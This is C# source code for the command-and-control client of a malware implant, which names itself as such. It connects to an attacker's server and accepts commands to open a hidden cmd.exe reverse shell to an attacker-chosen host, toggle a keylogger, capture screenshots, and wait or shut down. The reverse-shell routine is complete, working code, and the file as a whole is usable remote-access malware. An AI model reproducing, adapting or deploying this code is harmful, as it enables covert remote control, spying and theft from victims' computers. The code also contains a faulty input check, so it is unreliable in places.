using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace SnareNetStd
{
    /// <summary>
    /// This is a pretty epic class that probably needs a bit of cleanup.
    /// </summary>
    class C2Connection
    {

        private string c2ip { get; set; }
        private int c2port { get; set; }
        // Setting these here because I'm using them at the class level, rather than trying to throw them between functions.
        private TcpClient c2Client { get; set; }
        private NetworkStream c2Stream { get; set; }
        private List<KeyValuePair<string, string>> commands { get; set; }

        // Can't believe I'm doing this... probably not the best way to do this.
        // Tells the main loop above if we should drop connection and re-initiate (wait)
        public bool waitState { get; set; }
        // Or tells the main loop that we should stop running.
        public bool exitState { get; set; }

        private ScreenshotTask sst = new ScreenshotTask();

        /// <summary>
        /// Constructor
        /// </summary>
        /// <param name="ip">The Ip address to use</param>
        /// <param name="port">The Port to use</param>
        public C2Connection(string ip, int port)
        {
            c2ip = ip;
            c2port = port;
            commands = new List<KeyValuePair<string, string>>()
            {
                new KeyValuePair<string, string>("rev", "Reverse Shell(rev)"),
                new KeyValuePair<string, string>("kle", "Keylogger enable(kle)"),
                new KeyValuePair<string, string>("kld", "Keylogger disable (kld)"),
                new KeyValuePair<string, string>("klf", "Fetch keylogger events"),
                new KeyValuePair<string, string>("ssta", "Screenshots start(ssta)"),
                new KeyValuePair<string, string>("sstp", "Screenshots stop (sstp)"),
                new KeyValuePair<string, string>("test", "Test state (test)"),
                new KeyValuePair<string, string>("wait", "Wait and reconnect (wait)"),
                new KeyValuePair<string, string>("shutdown", "Shutdown (shutdown)")
            };

            waitState = false;
            exitState = false;

        }

        /// <summary>
        /// Function to set up the TCP communication for our piece of malware.
        /// </summary>
        public void Setup()
        {
            // Checks if things have been set up properly.
            // Namely that the IP and port are properly set.
            if (!string.IsNullOrWhiteSpace(c2ip))
            {
                // Create our client and stream for passing data.
                Console.WriteLine("Attempting connection to c2 server.");
                try
                {
                    c2Client = new TcpClient(c2ip, c2port);
                    c2Stream = c2Client.GetStream();
                }
                catch (SocketException e)
                {
                    Console.WriteLine("C2 Connection Error");
                    throw new C2ConnectionException("Could not connect to C2 server.");
                }
            }
            else
            {
                Console.WriteLine("Uh oh, looks like no IP or port was set for connecting to C2");
            }
        }

        /// <summary>
        /// Sends a message back to the Attackers CnC server.
        /// </summary>
        /// <param name="message">Message to send</param>
        /// <returns>String response from the server</returns>
        public string sendMessage(string message)
        {
            byte[] messageData = Encoding.ASCII.GetBytes(message);
            c2Stream.Write(messageData, 0, messageData.Length);
            byte[] responseData = new byte[256];
            string response = string.Empty;
            int bytes = c2Stream.Read(responseData, 0, responseData.Length);
            response = Encoding.ASCII.GetString(responseData, 0, bytes);

            return response;
        }

        /// <summary>
        /// Fetch something to do from the control server.
        /// </summary>
        public void fetchCommand()
        {
            while (true)
            {
                try
                {
                    string options = "SNARE Controller Requesting Command, My Lord!\n";
                    foreach (string opt in commands.Select(c => c.Value).ToList())
                    {
                        options += $"{opt}\n";
                    }

                    byte[] optionsBytes = Encoding.ASCII.GetBytes(options);
                    c2Stream.Write(optionsBytes, 0, optionsBytes.Length);
                    byte[] responseData = new byte[256];
                    string response = string.Empty;
                    int bytes = c2Stream.Read(responseData, 0, responseData.Length);
                    response = Encoding.ASCII.GetString(responseData, 0, bytes);
                    string command = parseCommand(response.Trim());
                    if (command == "nc")
                    {
                        Console.WriteLine("Invalid Command, looping back around");
                        continue;
                    }
                    runCommand(command);
                    break;

                }
                catch (Exception e) // Die gracefully if the connection drops or the attacker quits
                {
                    Console.WriteLine("Something went wrong");
                    break;
                }
            }

        }

        /// <summary>
        /// Makes sure the command entered is supported.
        /// </summary>
        /// <param name="command">The command to validate</param>
        /// <returns>The command if it is supported, or "nc" if not supported</returns>
        public string parseCommand(string command)
        {

            // Check if the returned command string is valid. if not error out.
            if (commands.Select(c => c.Key).ToList().Contains(command))
            {
                return command;
            }

            // nc = No Command, ie nothing was found as a valid command.
            Console.WriteLine("Invalid command entered");
            return "nc";
        }

        /// <summary>
        /// Execute the command against the target
        /// (This could be private and called by parseCommand above so that we know the command has been validated)
        /// </summary>
        /// <param name="command">The validated command to run</param>
        public void runCommand(string command)
        {
            try
            {

                if (command == "test")
                {
                    Console.WriteLine("Sending test message to server, will print response.");
                    string response = sendMessage("Testing Interaction with C2 Server\n");
                    Console.WriteLine("Recieved: {0}", response);
                }

                if (command == "wait")
                {
                    waitState = true;
                }

                if (command == "shutdown")
                {
                    exitState = true;
                }

                if (command == "rev")
                {
                    string ipPrompt = "IP:Port for Connection\n";
                    byte[] promptMsg = Encoding.ASCII.GetBytes(ipPrompt);
                    c2Stream.Write(promptMsg, 0, promptMsg.Length);
                    byte[] responseData = new byte[256];
                    string response = string.Empty;
                    int bytes = c2Stream.Read(responseData, 0, responseData.Length);
                    response = Encoding.ASCII.GetString(responseData, 0, bytes);
                    string[] ipPort = response.Trim().Split(':');
                    string ip = ipPort[0];
                    int.TryParse(ipPort[1], out int port);
                    Console.WriteLine("Recieved {0} {1}", ip, port.ToString());
                    Thread reverseShellThread = new Thread(() => reverseShell(ip, port));
                    reverseShellThread.Start();
                }

                if (command == "ssta")
                {
                    if (!sst.KeepGoing) // Is not already running ensures it only creates one thread
                    {
                        sst.KeepGoing = true;
                        Thread screenShotThread = new Thread(() => sst.TakeScreenshots());
                        screenShotThread.Start();
                    }
                    else
                    {
                        Console.WriteLine("Already spying on the screen.");
                    }
                }

                if (command == "sstp")
                {
                    Console.WriteLine("Stopping screenshots");
                    sst.KeepGoing = false;
                }

            }
            catch (Exception e) // Die gracefully if the connection drops or the attacker quits
            {
                return;
            }
        }

        /// <summary>
        /// Create a reverse shell and send it back to the attcker.
        /// </summary>
        /// <param name="ip">The IP address to send the shell to</param>
        /// <param name="port">The port to send the shell to</param>
        private void reverseShell(string ip, int port)
        {
            // Checks if things have been set up properly.
            // Namely that the IP and port are properly set.
            if (ip != null || port < 1)
            {
                // Create our client and stream for passing data.
                Console.WriteLine("Attempting connection to reverse shell reciever.");
                try
                {
                    // Set up our TCP client to talk to the reverse shell reciever (seperate from the C2 server, can be on the same box).
                    TcpClient revClient = new TcpClient(ip, port);
                    Stream revStream = revClient.GetStream();
                    StreamReader revStrmRdr = new StreamReader(revStream);
                    StreamWriter revStrmWtr = new StreamWriter(revStream);
                    StringBuilder revStrInput = new StringBuilder();

                    // Setup the piping to cmd.exe
                    Process shell = new Process();
                    shell.StartInfo.FileName = "cmd.exe";
                    shell.StartInfo.CreateNoWindow = true;
                    shell.StartInfo.UseShellExecute = false;
                    shell.StartInfo.RedirectStandardError = true;
                    shell.StartInfo.RedirectStandardInput = true;
                    shell.StartInfo.RedirectStandardOutput = true;
                    // Set up a handler to handle output from CMD back in to our stream, which will make it back to the reverse shell reciever.
                    shell.OutputDataReceived += new DataReceivedEventHandler(reverseShellOutputHandler);

                    // Handles response events from the reverse shell process.
                    void reverseShellOutputHandler(object sendingProcess, DataReceivedEventArgs outputLine)
                    {
                        StringBuilder strOutput = new StringBuilder();

                        if (!string.IsNullOrEmpty(outputLine.Data))
                        {
                            try
                            {
                                // Takes piped data from cmd.exe (via stdOut) and writes it to the stream writer hooked up to the socket.
                                strOutput.Append(outputLine.Data);
                                revStrmWtr.WriteLine(strOutput);
                                revStrmWtr.Flush();
                            }
                            catch (Exception err) { }
                        }
                    }

                    Console.WriteLine("Beginning Reverse Shell");
                    shell.Start();
                    shell.BeginOutputReadLine();
                    while (true)
                    {
                        // If this is true CMD has exited.
                        bool shellExit = false;
                        // Read a line from the socket input.
                        revStrInput.Append(revStrmRdr.ReadLine());
                        // Display said line for debugging purposes.
                        Console.WriteLine(revStrInput.ToString().Trim());
                        // If the input from the socket/reciever was "exit" then cmd.exe is going to close once we pass it the input.
                        // So set shellexit to be true.
                        if (revStrInput.ToString().Trim() == "exit")
                        {
                            shellExit = true;
                        }
                        shell.StandardInput.WriteLine(revStrInput);
                        // Clear our stringbuilding
                        revStrInput.Remove(0, revStrInput.Length);
                        // If cmd.exe has exited then we are good 2 go and can exit this loop, return us to normal operation.
                        if (shellExit)
                        {
                            break;
                        }
                    }

                    // Done. Close all our junk.
                    revStrmWtr.Close();
                    revStrmRdr.Close();
                    revStream.Close();
                    revClient.Close();
                    Console.WriteLine("Reverse shell finished.");
                }
                catch (SocketException e)
                {
                    Console.WriteLine("Connection Error");
                    throw new C2ConnectionException("Could not connect to reverse shell reciever.");
                }
            }
            else
            {
                Console.WriteLine("Uh oh, looks like no IP or port was set for connecting to C2");
            }
        }

        /// <summary>
        /// Close stuff we don't need. 
        /// </summary>
        public void tearDown()
        {
            c2Stream.Close();
            c2Client.Close();
            waitState = false;
            exitState = false;
        }

        /// <summary>
        /// If the connection fails...
        /// </summary>
        public class C2ConnectionException : Exception
        {
            public C2ConnectionException()
            {
            }

            public C2ConnectionException(string message) : base(message)
            {
            }
        }

        /// <summary>
        /// If the command is invalid
        /// </summary>
        public class C2InvalidCommandException : Exception
        {
            public C2InvalidCommandException()
            {

            }

            public C2InvalidCommandException(string message) : base(message)
            {

            }
        }
    }
}
